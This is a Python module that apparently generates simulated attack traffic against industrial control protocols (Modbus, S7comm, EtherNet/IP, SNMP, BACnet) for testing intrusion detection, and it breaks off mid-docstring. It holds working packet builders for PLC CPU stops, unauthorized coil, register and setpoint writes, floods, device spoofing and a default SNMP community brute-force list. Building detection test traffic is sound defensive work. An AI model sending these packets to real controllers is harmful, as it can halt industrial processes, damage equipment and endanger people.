"""ICS-protocol-specific attack action generators.

Registers generators for Modbus TCP, S7comm, EtherNet/IP, SNMP, and BACnet
attack actions.  Each generator builds raw protocol packets using the
existing packet builder modules, then wraps them in
:class:`~app.protocol_engines.types.PacketEvent` via the shared helper
:func:`_scapy_to_packet_event`.

All generators follow the standard signature::

    def generate(
        params: dict[str, Any],
        targets: list[TargetInfo],
        attacker_ip: str,
        start_time_ms: float,
    ) -> Iterator[PacketEvent]
"""

from __future__ import annotations

import logging
import random
import struct
from typing import Any, Iterator

from scapy.layers.inet import IP, TCP, UDP
from scapy.layers.l2 import Ether
from scapy.packet import Raw

from app.protocol_engines.types import PacketEvent

from .action_registry import (
    TargetInfo,
    _scapy_to_packet_event,
    register_action,
)

logger = logging.getLogger(__name__)


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _build_modbus_raw_packet(
    src_ip: str,
    dst_ip: str,
    payload: bytes,
    src_port: int = 0,
    dst_port: int = 502,
) -> bytes:
    """Build a raw Modbus-over-TCP Ethernet frame."""
    if src_port == 0:
        src_port = random.randint(49152, 65535)
    pkt = (
        Ether()
        / IP(src=src_ip, dst=dst_ip)
        / TCP(sport=src_port, dport=dst_port, flags="PA",
              seq=random.randint(1000, 0xFFFFFF),
              ack=random.randint(1000, 0xFFFFFF))
        / Raw(load=payload)
    )
    return pkt


def _build_mbap(transaction_id: int, unit_id: int, pdu: bytes) -> bytes:
    """Build MBAP header + PDU."""
    length = len(pdu) + 1  # +1 for unit_id
    return struct.pack(">HHHB", transaction_id, 0, length, unit_id) + pdu


# ---------------------------------------------------------------------------
# Modbus attack actions
# ---------------------------------------------------------------------------


@register_action("modbus_unit_enum")
def _modbus_unit_enum(
    params: dict[str, Any],
    targets: list[TargetInfo],
    attacker_ip: str,
    start_time_ms: float,
) -> Iterator[PacketEvent]:
    """Enumerate Modbus unit IDs using FC 17 (Report Server ID).

    Scans a range of unit IDs to discover responding devices.
    CV should detect: Modbus function code scanning / enumeration.
    """
    unit_range = params.get("unit_range", [1, 32])
    start_uid, end_uid = int(unit_range[0]), int(unit_range[1])
    interval_ms = params.get("interval_ms", 200)

    tid = random.randint(1, 65535)
    current_time = start_time_ms

    for target in targets:
        for uid in range(start_uid, end_uid + 1):
            # FC 17 = Report Server ID (0x11)
            pdu = bytes([0x11])
            payload = _build_mbap(tid, uid, pdu)
            pkt = _build_modbus_raw_packet(attacker_ip, target.ip_address, payload)
            yield _scapy_to_packet_event(current_time, pkt, "modbus_unit_enum", {
                "target_ip": target.ip_address,
                "unit_id": uid,
                "function_code": 0x11,
                "mitre_technique": "T0842",
            })
            tid = (tid + 1) & 0xFFFF
            current_time += interval_ms + random.randint(-20, 20)


@register_action("modbus_read_probe")
def _modbus_read_probe(
    params: dict[str, Any],
    targets: list[TargetInfo],
    attacker_ip: str,
    start_time_ms: float,
) -> Iterator[PacketEvent]:
    """Read holding registers across wide address ranges (FC 3).

    Probes register space to map device data.
    CV should detect: unusual register address ranges.
    """
    address_ranges = params.get("address_ranges", [[0, 100], [8192, 8300]])
    quantity = params.get("quantity", 10)
    step = params.get("step", 10)
    interval_ms = params.get("interval_ms", 150)

    tid = random.randint(1, 65535)
    unit_id = params.get("unit_id", 1)
    current_time = start_time_ms

    for target in targets:
        for addr_range in address_ranges:
            start_addr, end_addr = int(addr_range[0]), int(addr_range[1])
            for addr in range(start_addr, end_addr, step):
                count = min(quantity, end_addr - addr)
                # FC 3 = Read Holding Registers
                pdu = struct.pack(">BHH", 0x03, addr, count)
                payload = _build_mbap(tid, unit_id, pdu)
                pkt = _build_modbus_raw_packet(attacker_ip, target.ip_address, payload)
                yield _scapy_to_packet_event(current_time, pkt, "modbus_read_probe", {
                    "target_ip": target.ip_address,
                    "start_address": addr,
                    "quantity": count,
                    "mitre_technique": "T0802",
                })
                tid = (tid + 1) & 0xFFFF
                current_time += interval_ms + random.randint(-20, 20)


@register_action("modbus_write_coil")
def _modbus_write_coil(
    params: dict[str, Any],
    targets: list[TargetInfo],
    attacker_ip: str,
    start_time_ms: float,
) -> Iterator[PacketEvent]:
    """Unauthorized write to coil outputs (FC 5).

    CV should detect: unauthorized write operations.
    """
    address = params.get("address", 0)
    count = params.get("count", 5)
    interval_ms = params.get("interval_ms", 500)

    tid = random.randint(1, 65535)
    unit_id = params.get("unit_id", 1)
    current_time = start_time_ms

    for target in targets:
        for i in range(count):
            coil_addr = address + i
            # FC 5 = Write Single Coil, 0xFF00 = ON
            value = 0xFF00 if random.random() > 0.3 else 0x0000
            pdu = struct.pack(">BHH", 0x05, coil_addr, value)
            payload = _build_mbap(tid, unit_id, pdu)
            pkt = _build_modbus_raw_packet(attacker_ip, target.ip_address, payload)
            yield _scapy_to_packet_event(current_time, pkt, "modbus_write_coil", {
                "target_ip": target.ip_address,
                "coil_address": coil_addr,
                "value": value,
                "mitre_technique": "T0855",
            })
            tid = (tid + 1) & 0xFFFF
            current_time += interval_ms + random.randint(-50, 50)


@register_action("modbus_write_register")
def _modbus_write_register(
    params: dict[str, Any],
    targets: list[TargetInfo],
    attacker_ip: str,
    start_time_ms: float,
) -> Iterator[PacketEvent]:
    """Unauthorized write to holding registers (FC 6 / FC 16).

    CV should detect: unauthorized register write operations.
    """
    address = params.get("address", 0)
    count = params.get("count", 5)
    use_multi = params.get("use_multi_write", False)
    interval_ms = params.get("interval_ms", 500)

    tid = random.randint(1, 65535)
    unit_id = params.get("unit_id", 1)
    current_time = start_time_ms

    for target in targets:
        if use_multi:
            # FC 16 = Write Multiple Registers
            values = [random.randint(0, 65535) for _ in range(count)]
            data_bytes = b"".join(struct.pack(">H", v) for v in values)
            pdu = struct.pack(">BHHB", 0x10, address, count, count * 2) + data_bytes
            payload = _build_mbap(tid, unit_id, pdu)
            pkt = _build_modbus_raw_packet(attacker_ip, target.ip_address, payload)
            yield _scapy_to_packet_event(current_time, pkt, "modbus_write_register", {
                "target_ip": target.ip_address,
                "start_address": address,
                "quantity": count,
                "function_code": 0x10,
                "mitre_technique": "T0836",
            })
        else:
            for i in range(count):
                reg_addr = address + i
                value = random.randint(0, 65535)
                # FC 6 = Write Single Register
                pdu = struct.pack(">BHH", 0x06, reg_addr, value)
                payload = _build_mbap(tid, unit_id, pdu)
                pkt = _build_modbus_raw_packet(attacker_ip, target.ip_address, payload)
                yield _scapy_to_packet_event(current_time, pkt, "modbus_write_register", {
                    "target_ip": target.ip_address,
                    "register_address": reg_addr,
                    "value": value,
                    "function_code": 0x06,
                    "mitre_technique": "T0836",
                })
                tid = (tid + 1) & 0xFFFF
                current_time += interval_ms + random.randint(-50, 50)


@register_action("modbus_force_listen")
def _modbus_force_listen(
    params: dict[str, Any],
    targets: list[TargetInfo],
    attacker_ip: str,
    start_time_ms: float,
) -> Iterator[PacketEvent]:
    """Force Modbus device into listen-only mode (FC 8 sub-function 4).

    CV should detect: Modbus diagnostic command / denial of service.
    """
    from app.protocol_engines.external.exploit_patterns import (
        MODBUS_ATTACK_PATTERNS,
    )

    tid = random.randint(1, 65535)
    unit_id = params.get("unit_id", 0)  # broadcast

    for target in targets:
        # FC 8, sub-function 0x0004 = Force Listen Only Mode
        pdu = bytes([0x08]) + struct.pack(">HH", 0x0004, 0x0000)
        payload = _build_mbap(tid, unit_id, pdu)
        pkt = _build_modbus_raw_packet(attacker_ip, target.ip_address, payload)
        yield _scapy_to_packet_event(start_time_ms, pkt, "modbus_force_listen", {
            "target_ip": target.ip_address,
            "mitre_technique": "T0814",
        })


@register_action("coil_flood")
def _coil_flood(
    params: dict[str, Any],
    targets: list[TargetInfo],
    attacker_ip: str,
    start_time_ms: float,
) -> Iterator[PacketEvent]:
    """Rapid-fire coil writes — DoS-style attack (FC 5).

    CV should detect: write flood pattern, abnormal traffic rate.
    """
    address = params.get("address", 0)
    count = params.get("count", 64)
    rate_ms = params.get("rate_ms", 50)

    tid = random.randint(1, 65535)
    unit_id = params.get("unit_id", 1)
    current_time = start_time_ms

    for target in targets:
        for i in range(count):
            coil_addr = address + (i % 16)  # cycle through 16 coils
            value = 0xFF00 if (i % 2 == 0) else 0x0000  # toggle
            pdu = struct.pack(">BHH", 0x05, coil_addr, value)
            payload = _build_mbap(tid, unit_id, pdu)
            pkt = _build_modbus_raw_packet(attacker_ip, target.ip_address, payload)
            yield _scapy_to_packet_event(current_time, pkt, "coil_flood", {
                "target_ip": target.ip_address,
                "coil_address": coil_addr,
                "mitre_technique": "T0855",
            })
            tid = (tid + 1) & 0xFFFF
            current_time += rate_ms + random.randint(0, 10)


@register_action("register_manipulation")
def _register_manipulation(
    params: dict[str, Any],
    targets: list[TargetInfo],
    attacker_ip: str,
    start_time_ms: float,
) -> Iterator[PacketEvent]:
    """Gradual register value corruption — stealthy process manipulation.

    Incrementally changes register values to drift process parameters.
    CV should detect: value drift patterns, unauthorized writes.
    """
    base_address = params.get("address", 40000)
    register_count = params.get("register_count", 4)
    steps = params.get("steps", 20)
    interval_ms = params.get("interval_ms", 2000)
    drift_per_step = params.get("drift_per_step", 50)

    tid = random.randint(1, 65535)
    unit_id = params.get("unit_id", 1)
    current_time = start_time_ms
    current_values = [random.randint(1000, 30000) for _ in range(register_count)]

    for target in targets:
        for step in range(steps):
            # Drift each register slightly
            for j in range(register_count):
                drift = random.randint(-drift_per_step, drift_per_step)
                current_values[j] = max(0, min(65535, current_values[j] + drift))

            # Write all registers at once (FC 16)
            data_bytes = b"".join(struct.pack(">H", v) for v in current_values)
            pdu = (
                struct.pack(">BHHB", 0x10, base_address, register_count,
                            register_count * 2)
                + data_bytes
            )
            payload = _build_mbap(tid, unit_id, pdu)
            pkt = _build_modbus_raw_packet(attacker_ip, target.ip_address, payload)
            yield _scapy_to_packet_event(current_time, pkt, "register_manipulation", {
                "target_ip": target.ip_address,
                "step": step,
                "values": list(current_values),
                "mitre_technique": "T0836",
            })
            tid = (tid + 1) & 0xFFFF
            current_time += interval_ms + random.randint(-200, 200)


# ---------------------------------------------------------------------------
# S7comm attack actions
# ---------------------------------------------------------------------------


def _build_s7_attack_packet(
    src_ip: str,
    dst_ip: str,
    s7_payload: bytes,
    src_port: int = 0,
) -> bytes:
    """Build a full TPKT/COTP/S7 Ethernet frame for attack traffic."""
    if src_port == 0:
        src_port = random.randint(49152, 65535)

    # COTP DT header (data transfer, last fragment)
    cotp = bytes([0x02, 0xF0, 0x80])
    # TPKT header
    total_len = 4 + len(cotp) + len(s7_payload)
    tpkt = struct.pack(">BBH", 0x03, 0x00, total_len)

    raw_payload = tpkt + cotp + s7_payload
    pkt = (
        Ether()
        / IP(src=src_ip, dst=dst_ip)
        / TCP(sport=src_port, dport=102, flags="PA",
              seq=random.randint(1000, 0xFFFFFF),
              ack=random.randint(1000, 0xFFFFFF))
        / Raw(load=raw_payload)
    )
    return pkt


@register_action("s7_stop_cpu")
def _s7_stop_cpu(
    params: dict[str, Any],
    targets: list[TargetInfo],
    attacker_ip: str,
    start_time_ms: float,
) -> Iterator[PacketEvent]:
    """Send S7 CPU STOP command.

    CV should detect: PLC stop command, unauthorized control.
    """
    from app.protocol_engines.external.exploit_patterns import S7_ATTACK_PATTERNS

    current_time = start_time_ms

    for target in targets:
        # Use pre-built stop CPU payload (includes TPKT/COTP/S7)
        stop_payload = S7_ATTACK_PATTERNS["stop_cpu"]
        pkt = (
            Ether()
            / IP(src=attacker_ip, dst=target.ip_address)
            / TCP(sport=random.randint(49152, 65535), dport=102, flags="PA",
                  seq=random.randint(1000, 0xFFFFFF),
                  ack=random.randint(1000, 0xFFFFFF))
            / Raw(load=stop_payload)
        )
        yield _scapy_to_packet_event(current_time, pkt, "s7_stop_cpu", {
            "target_ip": target.ip_address,
            "mitre_technique": "T0816",
        })
        current_time += random.randint(500, 2000)


@register_action("s7_read_szl")
def _s7_read_szl(
    params: dict[str, Any],
    targets: list[TargetInfo],
    attacker_ip: str,
    start_time_ms: float,
) -> Iterator[PacketEvent]:
    """Read S7 System Status List (SZL) — device enumeration.

    Queries SZL IDs to extract module identification, firmware versions,
    and system configuration.
    CV should detect: S7 unauthorized system information access.
    """
    szl_ids = params.get("szl_ids", [0x0011, 0x001C, 0x0111])
    interval_ms = params.get("interval_ms", 500)

    current_time = start_time_ms
    pdu_ref = random.randint(1, 65535)

    for target in targets:
        for szl_id in szl_ids:
            # Build S7 userdata SZL request
            # S7 header: protocol_id=0x32, pdu_type=0x07 (userdata)
            param = bytes([
                0x00, 0x01, 0x12, 0x04, 0x11, 0x44, 0x01, 0x00,
            ])
            data = struct.pack(">BBHH",
                               0xFF,  # return code
                               0x09,  # transport size (octet string)
                               4,     # data length
                               szl_id)
            data += struct.pack(">H", 0x0000)  # szl_index

            s7_header = struct.pack(">BBHHHHH",
                                    0x32,       # protocol ID
                                    0x07,       # userdata
                                    0x0000,     # redundancy
                                    pdu_ref,
                                    len(param), # param length
                                    len(data),  # data length
                                    0x0000)     # (no error for job)
            # Remove last H for job type — S7 job header is shorter
            s7_header = struct.pack(">BBHHHH",
                                    0x32, 0x07, 0x0000,
                                    pdu_ref,
                                    len(param),
                                    len(data))

            s7_payload = s7_header + param + data
            pkt = _build_s7_attack_packet(attacker_ip, target.ip_address, s7_payload)

            yield _scapy_to_packet_event(current_time, pkt, "s7_read_szl", {
                "target_ip": target.ip_address,
                "szl_id": hex(szl_id),
                "mitre_technique": "T0802",
            })
            pdu_ref = (pdu_ref + 1) & 0xFFFF
            current_time += interval_ms + random.randint(-50, 50)


@register_action("s7_upload_block")
def _s7_upload_block(
    params: dict[str, Any],
    targets: list[TargetInfo],
    attacker_ip: str,
    start_time_ms: float,
) -> Iterator[PacketEvent]:
    """S7 block upload attempt — data theft / program extraction.

    CV should detect: S7 block transfer, unauthorized access.
    """
    from app.protocol_engines.external.exploit_patterns import S7_ATTACK_PATTERNS

    current_time = start_time_ms

    for target in targets:
        upload_payload = S7_ATTACK_PATTERNS["upload_block"]
        pkt = (
            Ether()
            / IP(src=attacker_ip, dst=target.ip_address)
            / TCP(sport=random.randint(49152, 65535), dport=102, flags="PA",
                  seq=random.randint(1000, 0xFFFFFF),
                  ack=random.randint(1000, 0xFFFFFF))
            / Raw(load=upload_payload)
        )
        yield _scapy_to_packet_event(current_time, pkt, "s7_upload_block", {
            "target_ip": target.ip_address,
            "mitre_technique": "T0845",
        })
        current_time += random.randint(200, 1000)


# ---------------------------------------------------------------------------
# EtherNet/IP attack actions
# ---------------------------------------------------------------------------


@register_action("enip_list_identity")
def _enip_list_identity(
    params: dict[str, Any],
    targets: list[TargetInfo],
    attacker_ip: str,
    start_time_ms: float,
) -> Iterator[PacketEvent]:
    """EtherNet/IP ListIdentity broadcast — device enumeration.

    CV should detect: CIP enumeration, device discovery.
    """
    interval_ms = params.get("interval_ms", 300)
    current_time = start_time_ms

    # EtherNet/IP encapsulation header for ListIdentity (command 0x0063)
    enip_header = struct.pack("<HIIHQI",
                              0x0063,  # command: ListIdentity
                              0,       # length (no data)
                              0,       # session handle
                              0,       # status
                              0,       # sender context
                              0)       # options

    for target in targets:
        pkt = (
            Ether()
            / IP(src=attacker_ip, dst=target.ip_address)
            / UDP(sport=random.randint(49152, 65535), dport=44818)
            / Raw(load=enip_header)
        )
        yield _scapy_to_packet_event(current_time, pkt, "enip_list_identity", {
            "target_ip": target.ip_address,
            "mitre_technique": "T0846",
        })
        current_time += interval_ms + random.randint(-30, 30)


@register_action("enip_cip_enum")
def _enip_cip_enum(
    params: dict[str, Any],
    targets: list[TargetInfo],
    attacker_ip: str,
    start_time_ms: float,
) -> Iterator[PacketEvent]:
    """CIP service enumeration via EtherNet/IP — deep device profiling.

    Queries CIP identity object attributes.
    CV should detect: CIP service enumeration.
    """
    interval_ms = params.get("interval_ms", 400)
    current_time = start_time_ms

    # ListServices command (0x0004)
    list_services = struct.pack("<HIIHQI",
                                0x0004, 0, 0, 0, 0, 0)

    for target in targets:
        # ListServices request
        pkt = (
            Ether()
            / IP(src=attacker_ip, dst=target.ip_address)
            / TCP(sport=random.randint(49152, 65535), dport=44818, flags="PA",
                  seq=random.randint(1000, 0xFFFFFF),
                  ack=random.randint(1000, 0xFFFFFF))
            / Raw(load=list_services)
        )
        yield _scapy_to_packet_event(current_time, pkt, "enip_cip_enum", {
            "target_ip": target.ip_address,
            "service": "ListServices",
            "mitre_technique": "T0846",
        })
        current_time += interval_ms


# ---------------------------------------------------------------------------
# SNMP attack actions
# ---------------------------------------------------------------------------


@register_action("snmp_walk")
def _snmp_walk(
    params: dict[str, Any],
    targets: list[TargetInfo],
    attacker_ip: str,
    start_time_ms: float,
) -> Iterator[PacketEvent]:
    """SNMP GetBulk walk of system MIB — device enumeration.

    CV should detect: SNMP enumeration, MIB walk.
    """
    community = params.get("community", "public")
    start_oid = params.get("start_oid", "1.3.6.1.2.1.1")
    num_requests = params.get("num_requests", 15)
    interval_ms = params.get("interval_ms", 200)

    current_time = start_time_ms
    request_id = random.randint(1, 0x7FFFFFFF)

    # OID encoding: simplified for common system MIB OIDs
    oid_parts = [int(x) for x in start_oid.split(".")]

    for target in targets:
        for i in range(num_requests):
            # Build a simplified SNMP GetBulk PDU (BER encoded)
            # This produces traffic that looks like SNMP on the wire
            snmp_pdu = _build_snmp_get_bulk(
                community=community,
                request_id=request_id + i,
                oid_parts=oid_parts,
                max_repetitions=10,
            )

            pkt = (
                Ether()
                / IP(src=attacker_ip, dst=target.ip_address)
                / UDP(sport=random.randint(49152, 65535), dport=161)
                / Raw(load=snmp_pdu)
            )
            yield _scapy_to_packet_event(current_time, pkt, "snmp_walk", {
                "target_ip": target.ip_address,
                "community": community,
                "oid": start_oid,
                "mitre_technique": "T0846",
            })
            # Simulate walking by incrementing last OID component
            oid_parts = list(oid_parts)
            oid_parts[-1] += 1
            current_time += interval_ms + random.randint(-20, 20)


@register_action("snmp_community_brute")
def _snmp_community_brute(
    params: dict[str, Any],
    targets: list[TargetInfo],
    attacker_ip: str,
    start_time_ms: float,
) -> Iterator[PacketEvent]:
    """SNMP community string brute force.

    CV should detect: SNMP brute force, multiple community strings.
    """
    communities = params.get("communities", [
        "public", "private", "community", "admin", "monitor",
        "snmp", "default", "cisco", "siemens", "manager",
    ])
    interval_ms = params.get("interval_ms", 150)

    current_time = start_time_ms
    request_id = random.randint(1, 0x7FFFFFFF)

    # Query system.sysDescr.0 with each community
    oid_parts = [1, 3, 6, 1, 2, 1, 1, 1, 0]

    for target in targets:
        for i, community in enumerate(communities):
            snmp_pdu = _build_snmp_get_request(
                community=community,
                request_id=request_id + i,
                oid_parts=oid_parts,
            )
            pkt = (
                Ether()
                / IP(src=attacker_ip, dst=target.ip_address)
                / UDP(sport=random.randint(49152, 65535), dport=161)
                / Raw(load=snmp_pdu)
            )
            yield _scapy_to_packet_event(current_time, pkt, "snmp_community_brute", {
                "target_ip": target.ip_address,
                "community": community,
                "mitre_technique": "T0866",
            })
            current_time += interval_ms + random.randint(-20, 20)


@register_action("snmp_set")
def _snmp_set(
    params: dict[str, Any],
    targets: list[TargetInfo],
    attacker_ip: str,
    start_time_ms: float,
) -> Iterator[PacketEvent]:
    """SNMP SET request — unauthorized configuration change.

    Writes values to writable MIB OIDs such as sysContact, sysName,
    or device-specific configuration objects.
    CV should detect: SNMP write attempt, unauthorized configuration change.
    """
    community = params.get("community", "private")
    # Default: overwrite sysContact and sysName
    oid_value_pairs = params.get("oid_value_pairs", [
        {"oid": "1.3.6.1.2.1.1.4.0", "value": "compromised@attacker.local"},
        {"oid": "1.3.6.1.2.1.1.5.0", "value": "PWNED-DEVICE"},
    ])
    interval_ms = params.get("interval_ms", 300)

    current_time = start_time_ms
    request_id = random.randint(1, 0x7FFFFFFF)

    for target in targets:
        for i, pair in enumerate(oid_value_pairs):
            oid_parts = [int(x) for x in pair["oid"].split(".")]
            value_str = str(pair.get("value", ""))
            snmp_pdu = _build_snmp_set_request(
                community=community,
                request_id=request_id + i,
                oid_parts=oid_parts,
                value=value_str,
            )
            pkt = (
                Ether()
                / IP(src=attacker_ip, dst=target.ip_address)
                / UDP(sport=random.randint(49152, 65535), dport=161)
                / Raw(load=snmp_pdu)
            )
            yield _scapy_to_packet_event(current_time, pkt, "snmp_set", {
                "target_ip": target.ip_address,
                "community": community,
                "oid": pair["oid"],
                "mitre_technique": "T0836",
            })
            current_time += interval_ms + random.randint(-30, 30)


@register_action("snmp_trap_flood")
def _snmp_trap_flood(
    params: dict[str, Any],
    targets: list[TargetInfo],
    attacker_ip: str,
    start_time_ms: float,
) -> Iterator[PacketEvent]:
    """SNMPv2c trap flood — overwhelm NMS with fake notifications.

    Sends rapid-fire trap PDUs to the management station to cause
    alert fatigue or denial of service on the NMS.
    CV should detect: SNMP trap flood, abnormal trap rate.
    """
    count = params.get("count", 100)
    rate_ms = params.get("rate_ms", 25)
    community = params.get("community", "public")
    # Generic linkDown trap OID
    trap_oid = params.get("trap_oid", "1.3.6.1.6.3.1.1.5.3")

    current_time = start_time_ms
    request_id = random.randint(1, 0x7FFFFFFF)

    for target in targets:
        for i in range(count):
            snmp_pdu = _build_snmp_v2c_trap(
                community=community,
                request_id=request_id + i,
                trap_oid_parts=[int(x) for x in trap_oid.split(".")],
                uptime_cs=random.randint(100000, 9999999),
            )
            pkt = (
                Ether()
                / IP(src=attacker_ip, dst=target.ip_address)
                / UDP(sport=random.randint(49152, 65535), dport=162)
                / Raw(load=snmp_pdu)
            )
            yield _scapy_to_packet_event(current_time, pkt, "snmp_trap_flood", {
                "target_ip": target.ip_address,
                "trap_oid": trap_oid,
                "mitre_technique": "T0814",
            })
            current_time += rate_ms + random.randint(0, 5)


@register_action("snmp_getbulk_sweep")
def _snmp_getbulk_sweep(
    params: dict[str, Any],
    targets: list[TargetInfo],
    attacker_ip: str,
    start_time_ms: float,
) -> Iterator[PacketEvent]:
    """Aggressive SNMP GetBulk sweep across multiple MIB subtrees.

    Walks system, interfaces, IP, and enterprise subtrees for deep
    infrastructure profiling of signal controllers and field devices.
    CV should detect: SNMP mass enumeration, extensive MIB walk.
    """
    community = params.get("community", "public")
    subtrees = params.get("subtrees", [
        "1.3.6.1.2.1.1",       # system
        "1.3.6.1.2.1.2",       # interfaces
        "1.3.6.1.2.1.4",       # ip
        "1.3.6.1.2.1.31",      # ifMIB (extended interfaces)
        "1.3.6.1.4.1",         # enterprises (vendor-specific)
    ])
    requests_per_subtree = params.get("requests_per_subtree", 10)
    interval_ms = params.get("interval_ms", 100)

    current_time = start_time_ms
    request_id = random.randint(1, 0x7FFFFFFF)

    for target in targets:
        for subtree in subtrees:
            oid_parts = [int(x) for x in subtree.split(".")]
            for i in range(requests_per_subtree):
                snmp_pdu = _build_snmp_get_bulk(
                    community=community,
                    request_id=request_id,
                    oid_parts=oid_parts,
                    max_repetitions=25,
                )
                pkt = (
                    Ether()
                    / IP(src=attacker_ip, dst=target.ip_address)
                    / UDP(sport=random.randint(49152, 65535), dport=161)
                    / Raw(load=snmp_pdu)
                )
                yield _scapy_to_packet_event(current_time, pkt, "snmp_getbulk_sweep", {
                    "target_ip": target.ip_address,
                    "subtree": subtree,
                    "mitre_technique": "T0846",
                })
                request_id = (request_id + 1) & 0x7FFFFFFF
                oid_parts = list(oid_parts)
                oid_parts[-1] += 1
                current_time += interval_ms + random.randint(-10, 10)


# ---------------------------------------------------------------------------
# BACnet attack actions
# ---------------------------------------------------------------------------


@register_action("bacnet_whois")
def _bacnet_whois(
    params: dict[str, Any],
    targets: list[TargetInfo],
    attacker_ip: str,
    start_time_ms: float,
) -> Iterator[PacketEvent]:
    """BACnet Who-Is broadcast — device discovery.

    CV should detect: BACnet device enumeration.
    """
    # BACnet/IP BVLC header (type=0x81, function=0x0B original-broadcast)
    # + NPDU (version=1, control=0x20 expecting-reply)
    # + APDU (PDU type=1 unconfirmed, service=8 Who-Is)
    bvlc = bytes([0x81, 0x0B, 0x00, 0x0C])  # 12 bytes total
    npdu = bytes([0x01, 0x20, 0xFF, 0xFF, 0x00, 0xFF])  # broadcast
    apdu = bytes([0x10, 0x08])  # unconfirmed Who-Is

    pkt_bytes = bvlc + npdu + apdu

    for target in targets:
        pkt = (
            Ether()
            / IP(src=attacker_ip, dst=target.ip_address)
            / UDP(sport=47808, dport=47808)
            / Raw(load=pkt_bytes)
        )
        yield _scapy_to_packet_event(start_time_ms, pkt, "bacnet_whois", {
            "target_ip": target.ip_address,
            "mitre_technique": "T0846",
        })


@register_action("bacnet_read_property")
def _bacnet_read_property(
    params: dict[str, Any],
    targets: list[TargetInfo],
    attacker_ip: str,
    start_time_ms: float,
) -> Iterator[PacketEvent]:
    """BACnet ReadProperty requests — device object enumeration.

    Reads object-list, firmware-revision, model-name, and other
    properties to fingerprint BACnet controllers and map the BMS.
    CV should detect: BACnet property enumeration from non-BMS source.
    """
    # BACnet property IDs to enumerate
    property_ids = params.get("property_ids", [
        76,   # object-list
        44,   # firmware-revision
        70,   # model-name
        121,  # vendor-name
        120,  # vendor-identifier
    ])
    device_instance = params.get("device_instance", 100)
    interval_ms = params.get("interval_ms", 300)
    invoke_id = random.randint(0, 254)

    current_time = start_time_ms

    for target in targets:
        for prop_id in property_ids:
            apdu = _build_bacnet_read_property_apdu(
                invoke_id=invoke_id,
                object_type=8,  # device object
                instance=device_instance,
                property_id=prop_id,
            )
            pkt_bytes = _build_bacnet_ip_frame(apdu, broadcast=False)
            pkt = (
                Ether()
                / IP(src=attacker_ip, dst=target.ip_address)
                / UDP(sport=47808, dport=47808)
                / Raw(load=pkt_bytes)
            )
            yield _scapy_to_packet_event(current_time, pkt, "bacnet_read_property", {
                "target_ip": target.ip_address,
                "property_id": prop_id,
                "mitre_technique": "T0802",
            })
            invoke_id = (invoke_id + 1) & 0xFF
            current_time += interval_ms + random.randint(-30, 30)


@register_action("bacnet_write_property")
def _bacnet_write_property(
    params: dict[str, Any],
    targets: list[TargetInfo],
    attacker_ip: str,
    start_time_ms: float,
) -> Iterator[PacketEvent]:
    """BACnet WriteProperty — unauthorized setpoint manipulation.

    Writes to analog-value or analog-output present-value properties
    to alter HVAC setpoints, lighting levels, or other building controls.
    CV should detect: unauthorized BACnet write, setpoint change.
    """
    # Object type 2 = analog-value, property 85 = present-value
    object_type = params.get("object_type", 2)
    instance = params.get("instance", 1)
    property_id = params.get("property_id", 85)  # present-value
    values = params.get("values", [5.0, 40.0, 5.0, 40.0])  # extreme temps
    interval_ms = params.get("interval_ms", 1500)
    invoke_id = random.randint(0, 254)

    current_time = start_time_ms

    for target in targets:
        for value in values:
            apdu = _build_bacnet_write_property_apdu(
                invoke_id=invoke_id,
                object_type=object_type,
                instance=instance,
                property_id=property_id,
                value=value,
            )
            pkt_bytes = _build_bacnet_ip_frame(apdu, broadcast=False)
            pkt = (
                Ether()
                / IP(src=attacker_ip, dst=target.ip_address)
                / UDP(sport=47808, dport=47808)
                / Raw(load=pkt_bytes)
            )
            yield _scapy_to_packet_event(current_time, pkt, "bacnet_write_property", {
                "target_ip": target.ip_address,
                "object_type": object_type,
                "instance": instance,
                "value": value,
                "mitre_technique": "T0836",
            })
            invoke_id = (invoke_id + 1) & 0xFF
            current_time += interval_ms + random.randint(-100, 100)


@register_action("bacnet_whois_flood")
def _bacnet_whois_flood(
    params: dict[str, Any],
    targets: list[TargetInfo],
    attacker_ip: str,
    start_time_ms: float,
) -> Iterator[PacketEvent]:
    """BACnet Who-Is flood — exhaust controller resources.

    Rapid-fire Who-Is broadcasts to overwhelm BACnet device stacks,
    causing BMS communication loss.
    CV should detect: BACnet flood, excessive broadcast traffic.
    """
    count = params.get("count", 200)
    rate_ms = params.get("rate_ms", 15)

    bvlc = bytes([0x81, 0x0B, 0x00, 0x0C])
    npdu = bytes([0x01, 0x20, 0xFF, 0xFF, 0x00, 0xFF])
    apdu = bytes([0x10, 0x08])
    pkt_bytes = bvlc + npdu + apdu

    current_time = start_time_ms

    for target in targets:
        for _ in range(count):
            pkt = (
                Ether()
                / IP(src=attacker_ip, dst=target.ip_address)
                / UDP(sport=47808, dport=47808)
                / Raw(load=pkt_bytes)
            )
            yield _scapy_to_packet_event(current_time, pkt, "bacnet_whois_flood", {
                "target_ip": target.ip_address,
                "mitre_technique": "T0814",
            })
            current_time += rate_ms + random.randint(0, 5)


@register_action("bacnet_iam_spoof")
def _bacnet_iam_spoof(
    params: dict[str, Any],
    targets: list[TargetInfo],
    attacker_ip: str,
    start_time_ms: float,
) -> Iterator[PacketEvent]:
    """BACnet I-Am spoofing — inject false device identities.

    Broadcasts I-Am responses with fabricated device instances to
    confuse BMS device tables and disrupt supervisory control.
    CV should detect: BACnet device spoofing, duplicate device instances.
    """
    count = params.get("count", 20)
    interval_ms = params.get("interval_ms", 500)
    start_instance = params.get("start_instance", 9000)

    current_time = start_time_ms

    for target in targets:
        for i in range(count):
            device_instance = start_instance + i
            iam_apdu = _build_bacnet_iam_apdu(
                device_instance=device_instance,
                max_apdu=1476,
                vendor_id=random.randint(0, 999),
            )
            pkt_bytes = _build_bacnet_ip_frame(iam_apdu, broadcast=True)
            pkt = (
                Ether()
                / IP(src=attacker_ip, dst=target.ip_address)
                / UDP(sport=47808, dport=47808)
                / Raw(load=pkt_bytes)
            )
            yield _scapy_to_packet_event(current_time, pkt, "bacnet_iam_spoof", {
                "target_ip": target.ip_address,
                "spoofed_instance": device_instance,
                "mitre_technique": "T0830",
            })
            current_time += interval_ms + random.randint(-50, 50)


# ---------------------------------------------------------------------------
# Cross-device communication
# ---------------------------------------------------------------------------


@register_action("cross_device_comm")
def _cross_device_comm(
    params: dict[str, Any],
    targets: list[TargetInfo],
    attacker_ip: str,
    start_time_ms: float,
) -> Iterator[PacketEvent]:
    """Traffic between devices that don't normally communicate.

    Simulates lateral movement by generating protocol traffic between
    two OT devices that wouldn't normally talk to each other.
